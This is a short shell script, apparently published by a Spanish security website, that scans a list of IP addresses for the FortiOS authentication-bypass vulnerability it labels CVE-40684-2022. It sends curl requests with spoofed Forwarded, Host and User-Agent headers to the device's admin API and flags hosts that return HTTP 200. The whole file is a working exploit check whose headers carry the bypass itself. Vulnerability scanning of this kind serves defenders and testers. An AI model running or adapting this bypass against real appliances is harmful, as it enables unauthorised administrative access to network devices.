#!/bin/sh
# cve-40684-2022
echo "Test vulnerabilidad Fortinet CVE-40684-2022 salta autenticacion en FortiOS 7.x --- www.hackingyseguridad.com --- "
echo "Lee del fichero ip.txt, con la lista de IP o fqdn a analizar .."
echo "Uso: ./cve-40684-2022.sh puerto_TCP"
echo "..."
echo
for I in `cat ip.txt`; do if timeout 10 curl --http2 -s -k -I -X 'GET'  -H 'Host: 127.0.0.1:9980' -H 'User-Agent: Node.js' -H 'Accept-Encoding\": gzip, deflate' -H 'Forwarded: by=\"[127.0.0.1]:80\";for=\"[127.0.0.1]:49490\";proto=http;host=' -H 'X-Forwarded-Vdom: root' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' "https://$I:$1/api/v2/cmdb/system/admin"  \  |grep "HTTP/2 200"
        then echo $I  "===> Vulnerable !!! "
        # curl -k -I -v https://$I/$1
        fi
done
